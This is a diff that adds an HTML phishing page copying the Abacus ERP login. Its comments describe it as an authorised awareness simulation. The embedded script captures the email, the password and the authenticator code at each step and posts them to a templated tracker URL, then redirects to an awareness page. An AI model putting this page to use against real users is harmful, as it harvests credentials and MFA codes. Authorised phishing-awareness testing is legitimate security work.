@@ -1,0 +1,129 @@
+<!doctype html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Abacus ERP Login</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 44 44'%3E%3Cg fill='%23de323c'%3E%3Ccircle cx='22' cy='7' r='2.6'/%3E%3Ccircle cx='15' cy='14' r='2.4'/%3E%3Ccircle cx='29' cy='14' r='2.4'/%3E%3Ccircle cx='8' cy='21' r='2.1'/%3E%3Ccircle cx='22' cy='21' r='2.1'/%3E%3Ccircle cx='36' cy='21' r='2.1'/%3E%3Ccircle cx='15' cy='28' r='2.4'/%3E%3Ccircle cx='29' cy='28' r='2.4'/%3E%3Ccircle cx='22' cy='35' r='2.6'/%3E%3C/g%3E%3C/svg%3E">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="aba-shell">
+  <div class="aba-header">
+    <span class="aba-header-title">Abacus ERP Login</span>
+    <span class="aba-logo" aria-label="Abacus">
+      <svg preserveAspectRatio="xMinYMin meet" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 50" height="30" role="img" aria-label="Abacus Logo"><title>Abacus Logo</title><path d="m185.13 29.58 3.49 3.42a15.39 15.39 0 0 1-11.74 5.19c-8.82 0-15.48-6.75-15.48-15.79s6.78-15.79 15.44-15.79a15.29 15.29 0 0 1 11.34 4.8l-3.53 3.44a10.51 10.51 0 0 0-7.77-3.36c-6.08 0-10.16 5.08-10.16 10.91s4.2 10.9 10.21 10.9a10.88 10.88 0 0 0 8.2-3.72ZM245.35 25c-4.84-1.79-9.55-4.19-9.55-9.42 0-4.81 4-8.9 9.9-8.9a13 13 0 0 1 10 4.84l-3.62 3.58a8.39 8.39 0 0 0-6.37-3.45c-2.41 0-4.62 1.36-4.62 3.75 0 5.9 15.13 3.75 15.13 14.09 0 5.7-4.68 8.77-10.42 8.77A13.07 13.07 0 0 1 234.44 32l3.93-3.32c1.7 2.71 4.27 4.58 7.46 4.58 2.59 0 5.1-1.09 5.1-3.7s-2.99-3.68-5.58-4.56ZM223.9 7.16v19.45c0 6.7-4.56 11.61-11.77 11.61s-11.78-4.92-11.78-11.61V7.16h5.23V26c0 4.26 2.1 7.28 6.55 7.28s6.54-3 6.54-7.28V7.16ZM68.3 6.18 53.77 37.69h5.33l9.2-20.13 9.17 20.13h5.34L68.3 6.18zM138.93 6.18 124.4 37.69h5.35l9.18-20.13 9.18 20.13h5.35L138.93 6.18zM110.38 21.51c1.75-.88 3.18-2.85 3.18-6 0-5.47-4.31-8.33-9.72-8.33h-9.9v30.51h11c5.52 0 10.2-3.41 10.2-9.07-.01-3.76-2.53-6.55-4.76-7.11Zm-5.61 11.85h-5.93V11.49h4.77c2.87 0 5 1.29 5 4.17s-1.87 4.11-4.79 4.11l1 4.68c3.08 0 5.31 1.3 5.31 4.35.04 3.28-2.13 4.56-5.36 4.56Z" fill="#282828"></path><path d="M12.17 13.79a1.85 1.85 0 1 0-2.62 0 1.85 1.85 0 0 0 2.62 0ZM17.16 18.66a1.85 1.85 0 1 0-2.61 0 1.87 1.87 0 0 0 2.61 0ZM14.2 5.88a2.25 2.25 0 1 0 3.19 0 2.25 2.25 0 0 0-3.19 0ZM22.37 10.81a2.25 2.25 0 1 0 0 3.08 2.24 2.24 0 0 0 0-3.08ZM27.3 15.74a2.25 2.25 0 1 0 0 3.18 2.23 2.23 0 0 0 0-3.15ZM33.74 25.36a2.64 2.64 0 1 0 3.74 0 2.64 2.64 0 0 0-3.74 0ZM28.78 30.32a2.64 2.64 0 1 0 3.74 0 2.64 2.64 0 0 0-3.74 0ZM23.84 35.25a2.64 2.64 0 1 0 3.74 0 2.65 2.65 0 0 0-3.74 0ZM18.89 40.22a2.64 2.64 0 1 0 3.74 0 2.63 2.63 0 0 0-3.72 0ZM42.39 20.5a2.64 2.64 0 1 0 0 3.73 2.63 2.63 0 0 0 0-3.72ZM33.72 19.37a2.64 2.64 0 1 0 0-3.74 2.64 2.64 0 0 0 0 3.74ZM28.76 14.41a2.64 2.64 0 1 0 0-3.74 2.64 2.64 0 0 0 0 3.74ZM23.83 9.47a2.64 2.64 0 1 0 0-3.73 2.63 2.63 0 0 0 0 3.72ZM22.6 4.51a2.64 2.64 0 1 0-3.73 0 2.62 2.62 0 0 0 3.71 0ZM14.2 35.59a2.25 2.25 0 1 0 3.19 0 2.23 2.23 0 0 0-3.15 0ZM9.61 30.89a1.85 1.85 0 1 0 2.62 0 1.85 1.85 0 0 0-2.62 0ZM14.48 28.51a1.85 1.85 0 1 0 0-2.62 1.86 1.86 0 0 0 0 2.62ZM22.06 23.61a1.85 1.85 0 1 0-2.62 0 1.85 1.85 0 0 0 2.62 0ZM9.9 21.17a1.45 1.45 0 1 0 2 0 1.46 1.46 0 0 0-2 0ZM4.87 26.07a1.46 1.46 0 1 0 1.92 2.2.93.93 0 0 0 .14-.14 1.46 1.46 0 0 0-2.06-2.06ZM5.29 16.52a1.46 1.46 0 0 0 0 2.05 1.45 1.45 0 1 0 2.05-2.05 1.43 1.43 0 0 0-2 0ZM.38 21.37a1.28 1.28 0 0 0 0 1.8 1.28 1.28 0 0 0 1.8 0 1.29 1.29 0 0 0-.12-1.82 1.3 1.3 0 0 0-1.68.02ZM19.13 33.77a2.25 2.25 0 1 0 0-3.18 2.26 2.26 0 0 0 0 3.18ZM24.06 25.66a2.25 2.25 0 1 0 3.19 0 2.26 2.26 0 0 0-3.19 0ZM29.06 20.73a2.25 2.25 0 1 0 3.19 0 2.25 2.25 0 0 0-3.19 0Z" fill="#de323c"></path></svg>
+    </span>
+  </div>
+
+  <div class="aba-card" data-step="email">
+    <form id="step-email" autocomplete="off">
+      <div class="aba-card-title">Bitte melden Sie sich bei Abacus an</div>
+      <label class="aba-label" for="aba-user">Benutzername / E-Mail</label>
+      <input type="email" name="email" id="aba-user" class="aba-field" placeholder="vorname.nachname@firma.ch" required autofocus>
+      <div class="aba-row">
+        <a class="aba-link" href="#">Passwort vergessen?</a>
+        <button type="submit" class="aba-btn">Weiter</button>
+      </div>
+    </form>
+
+    <form id="step-password" autocomplete="off" style="display:none">
+      <div class="aba-card-title">Passwort eingeben</div>
+      <div class="aba-account"><span class="aba-account-dot"></span><span id="email-echo">user@example.com</span></div>
+      <label class="aba-label" for="aba-pwd">Passwort</label>
+      <input type="password" name="password" id="aba-pwd" class="aba-field" placeholder="Passwort" required>
+      <div class="aba-row">
+        <a class="aba-link" href="#">Passwort vergessen?</a>
+        <button type="submit" class="aba-btn">Anmelden</button>
+      </div>
+    </form>
+
+    <form id="step-2fa" autocomplete="off" style="display:none">
+      <div class="aba-card-title">Bestätigen Sie Ihre Identität</div>
+      <div class="aba-account"><span class="aba-account-dot"></span><span id="email-echo-2">user@example.com</span></div>
+      <p class="aba-sub">Geben Sie den Code aus Ihrer Authenticator-App ein.</p>
+      <label class="aba-label" for="aba-code">Bestätigungscode</label>
+      <input type="text" name="code_2fa" id="aba-code" class="aba-field aba-code" inputmode="numeric" pattern="[0-9]{4,8}" maxlength="8" placeholder="000000" required>
+      <div class="aba-row aba-row-end">
+        <button type="submit" class="aba-btn">Bestätigen</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="aba-footer">
+    <span class="aba-footer-news">&#9993;&#65039; Newsletter abonnieren</span>
+    <span class="aba-footer-lang">Deutsch</span>
+  </div>
+</div>
+
+<script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
+<script>
+(function () {
+  // CAPTURE variant (authorised simulation): records email + password (+ OTP
+  // when enabled) to the tracker, then redirects to a built-in awareness page
+  // (learn.html) — "Ooops, du wurdest gephisht" — instead of the real login.
+  //
+  // URL params (set by the phishing mail's CTA):
+  //   rid / trackerId  — tracker context (also read from window.__taphish_tracker)
+  //   email | login_hint — pre-fills the account and jumps straight to the
+  //                        password step, mirroring M365's real login_hint flow
+  //   mfa=0            — skip the OTP step for this campaign (default: keep OTP)
+  var POST_URL = "{{POST_URL}}";
+  var Q = new URLSearchParams(location.search);
+  var prefillEmail = (Q.get("email") || Q.get("login_hint") || "").trim();
+  var captureMfa   = Q.get("mfa") !== "0"; // OTP step on by default; mfa=0 disables
+  function trackerCtx() {
+    var t = window.__taphish_tracker || {};
+    return { rid: t.rid || Q.get("rid") || "", sess_id: t.session_id || Q.get("sess_id") || "", trackerId: t.tracker_id || Q.get("trackerId") || "" };
+  }
+  function post(payload, cb) {
+    if (!POST_URL) { cb(); return; }
+    fetch(POST_URL, { method: "POST", mode: "cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).then(cb, cb);
+  }
+  var formEmail = document.getElementById("step-email");
+  var formPwd   = document.getElementById("step-password");
+  var form2fa   = document.getElementById("step-2fa");
+  var emailVal = "", pwdVal = "";
+
+  function echoEmail() {
+    document.getElementById("email-echo").textContent = emailVal;
+    document.getElementById("email-echo-2").textContent = emailVal;
+  }
+  function gotoPwd() { echoEmail(); formEmail.style.display = "none"; formPwd.style.display = "block"; }
+  function redirectAware(ctx) {
+    var rid = ctx.rid ? ("?rid=" + encodeURIComponent(ctx.rid)) : "";
+    setTimeout(function () { location.href = "learn.html" + rid; }, 250);
+  }
+
+  formEmail.addEventListener("submit", function (e) {
+    e.preventDefault();
+    emailVal = formEmail.elements["email"].value;
+    var ctx = trackerCtx();
+    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { gotoPwd(); });
+  });
+  formPwd.addEventListener("submit", function (e) {
+    e.preventDefault();
+    pwdVal = formPwd.elements["password"].value;
+    var ctx = trackerCtx();
+    post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
+      if (captureMfa) { formPwd.style.display = "none"; form2fa.style.display = "block"; }
+      else { redirectAware(ctx); }
+    });
+  });
+  form2fa.addEventListener("submit", function (e) {
+    e.preventDefault();
+    var code = form2fa.elements["code_2fa"].value;
+    var ctx = trackerCtx();
+    post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { redirectAware(ctx); });
+  });
+
+  // Pre-fill the username field (editable), exactly like M365's login_hint: the
+  // normal email -> Next -> password flow is preserved, the address is just
+  // seeded into the field. The recipient still sees and can edit it.
+  if (prefillEmail && formEmail.elements["email"]) {
+    formEmail.elements["email"].value = prefillEmail;
+  }
+})();
+</script>
+</body>
+</html>
